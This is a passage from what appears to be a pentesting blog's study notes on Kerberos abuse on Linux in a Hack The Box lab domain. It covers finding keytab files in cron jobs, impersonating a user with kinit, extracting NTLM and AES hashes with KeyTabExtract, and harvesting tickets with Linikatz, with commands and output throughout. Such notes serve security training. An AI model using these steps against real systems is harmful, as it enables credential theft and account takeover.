-<h4 id="Identifying-Keytab-files-in-Cronjobs"><a href="#Identifying-Keytab-files-in-Cronjobs" class="headerlink" title="Identifying Keytab files in Cronjobs"></a>Identifying Keytab files in Cronjobs</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># Edit this file to introduce tasks to be run by cron.</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">...SNIP...</span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line">*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh</span><br></pre></td></tr></table></figure>
-
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt</span><br><span class="line"></span><br><span class="line">smbclient //dc01.inlanefreight.htb/svc_workstations -c <span class="string">&#x27;ls&#x27;</span>  -k -no-pass &gt; /home/carlos@inlanefreight.htb/script-test-results.txt</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="KeyTab-File-Abuse"><a href="#KeyTab-File-Abuse" class="headerlink" title="KeyTab File Abuse"></a>KeyTab File Abuse</h1><h2 id="Impersonating-User-With-KeyTab"><a href="#Impersonating-User-With-KeyTab" class="headerlink" title="Impersonating User With KeyTab"></a>Impersonating User With KeyTab</h2><h4 id="Listing-KeyTab-file-information"><a href="#Listing-KeyTab-file-information" class="headerlink" title="Listing KeyTab file information"></a>Listing KeyTab file information</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist -k -t /opt/specialfiles/carlos.keytab </span><br><span class="line"></span><br><span class="line">Keytab name: FILE:/opt/specialfiles/carlos.keytab</span><br><span class="line">KVNO Timestamp           Principal</span><br><span class="line">---- ------------------- ------------------------------------------------------</span><br><span class="line">   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>
-
-<h4 id="Impersonating-Target-User"><a href="#Impersonating-Target-User" class="headerlink" title="Impersonating Target User"></a>Impersonating Target User</h4><p><code>➜ Note: kinit is case-sensitive, so we must use the exact same principal name as shown in klist.</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">klist </span><br><span class="line"></span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401107_r5qiuu</span><br><span class="line">Default principal: carlos@INLANEFREIGHT.HTB</span><br><span class="line"></span><br><span class="line">Valid starting     Expires            Service principal</span><br><span class="line">10/06/22 17:16:11  10/07/22 03:16:11  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">        renew <span class="keyword">until</span> 10/07/22 17:16:11</span><br></pre></td></tr></table></figure>
-
-<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>Connecting to SMB Share as Carlos</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient //dc01/carlos -k -c <span class="built_in">ls</span></span><br><span class="line"></span><br><span class="line">  .                                   D        0  Thu Oct  6 14:46:26 2022</span><br><span class="line">  ..                                  D        0  Thu Oct  6 14:46:26 2022</span><br><span class="line">  carlos.txt                          A       15  Thu Oct  6 14:46:54 2022</span><br><span class="line"></span><br><span class="line">                7706623 blocks of size 4096. 4452852 blocks available</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="Extract-NTLM-Hash-From-Keytab"><a href="#Extract-NTLM-Hash-From-Keytab" class="headerlink" title="Extract NTLM Hash From Keytab"></a>Extract NTLM Hash From Keytab</h2><h4 id="Extracting-KeyTab-hashes-with-KeyTabExtract"><a href="#Extracting-KeyTab-hashes-with-KeyTabExtract" class="headerlink" title="Extracting KeyTab hashes with KeyTabExtract"></a>Extracting KeyTab hashes with KeyTabExtract</h4><p> <a href="https://github.com/sosdave/KeyTabExtract">KeyTabExtract</a> will extract information such as the realm, Service Principal, Encryption Type, and Hashes.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab </span><br><span class="line"></span><br><span class="line">[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM <span class="built_in">hash</span>.</span><br><span class="line">[*] AES256-CTS-HMAC-SHA1 key found. Will attempt <span class="built_in">hash</span> extraction.</span><br><span class="line">[*] AES128-CTS-HMAC-SHA1 <span class="built_in">hash</span> discovered. Will attempt <span class="built_in">hash</span> extraction.</span><br><span class="line">[+] Keytab File successfully imported.</span><br><span class="line">        REALM : INLANEFREIGHT.HTB</span><br><span class="line">        SERVICE PRINCIPAL : carlos/</span><br><span class="line">        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60</span><br><span class="line">        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f</span><br><span class="line">        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4</span><br></pre></td></tr></table></figure>
-
-<p><code>➜ Then we can perform pass hash attack or crack the ntlm hash</code></p>
-<h1 id="Automated-Harvesting-Of-Ccache-Files"><a href="#Automated-Harvesting-Of-Ccache-Files" class="headerlink" title="Automated Harvesting Of Ccache Files"></a>Automated Harvesting Of Ccache Files</h1><h2 id="Linikatz"><a href="#Linikatz" class="headerlink" title="Linikatz"></a>Linikatz</h2><p><code>➜ It requires root access and extracts credentials (including Kerberos tickets) from services like FreeIPA, SSSD, Samba, and others.</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[!bash!]$ /opt/linikatz.sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">10/10/2022 19:48:03  10/11/2022 05:48:03  krbtgt/INLANEFREIGHT.HTB@INLANEFREIGHT.HTB</span><br><span class="line">    renew <span class="keyword">until</span> 10/11/2022 19:48:03, Flags: RIA</span><br><span class="line">    Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96 , AD types: </span><br><span class="line">I: [kerberos-check] User Kerberos tickets</span><br><span class="line">Ticket cache: FILE:/tmp/krb5cc_647401106_HRJDux</span><br><span class="line">Default principal: julio@INLANEFREIGHT.HTB</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Active Directory</category>
-        <category>Linux</category>
-        <category>Post Exploitation</category>
-        <category>Pass the Ticket (Ptt)</category>
-        <category>KeyTab File Abuse</category>
-      </categories>
-      <tags>
-        <tag>klist</tag>
-        <tag>kinit</tag>
-        <tag>KeyTabExtract</tag>
       </tags>
   </entry>
   <entry>
